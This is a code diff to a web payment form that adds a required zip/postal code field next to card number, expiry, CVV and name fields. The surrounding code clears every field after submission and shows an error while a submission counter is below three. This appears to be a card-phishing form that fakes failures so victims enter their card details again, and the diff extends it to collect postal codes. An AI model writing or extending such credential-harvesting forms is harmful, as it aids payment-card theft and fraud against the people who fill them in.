@@ -178,6 +178,12 @@
                     <div class="error" id="nameError">Please enter your name</div>
                 </div>
 
+                <div class="form-group">
+                    <input type="text" id="zipcode" name="zipcode" placeholder=" " required autocomplete="postal-code">
+                    <label for="zipcode">Zip/Postal Code</label>
+                    <div class="error" id="zipcodeError">Please enter a valid zip/postal code</div>
+                </div>
+
                 <button type="submit">Submit</button>
             </form>
 
@@ -194,6 +200,7 @@
             const expirationInput = document.getElementById('expirationDate');
             const cvvInput = document.getElementById('cvv');
             const nameInput = document.getElementById('nameOnCard');
+            const zipcodeInput = document.getElementById('zipcode');
             const honeypotInput = document.getElementById('honeypot');
             let submissionCount = 0; // Initialize submission count
             
@@ -226,6 +233,10 @@
                     document.getElementById('nameError').style.display = 'block';
                     isValid = false;
                 }
+                if (!zipcodeInput.value.trim()) {
+                    document.getElementById('zipcodeError').style.display = 'block';
+                    isValid = false;
+                }
 
                 // Prevent submission if any fields are empty
                 if (!isValid) return;
@@ -250,6 +261,7 @@
                 expirationInput.value = '';
                 cvvInput.value = '';
                 nameInput.value = '';
+                zipcodeInput.value = '';
 
                 // Show error message
                 if (submissionCount < 3) {
@@ -261,7 +273,7 @@
             });
             
             // Clear errors on focus
-            [cardNumberInput, expirationInput, cvvInput, nameInput].forEach(input => {
+            [cardNumberInput, expirationInput, cvvInput, nameInput, zipcodeInput].forEach(input => {
                 input.addEventListener('focus', function() {
                     const errorElement = document.getElementById(input.id + 'Error');
                     if (errorElement) {
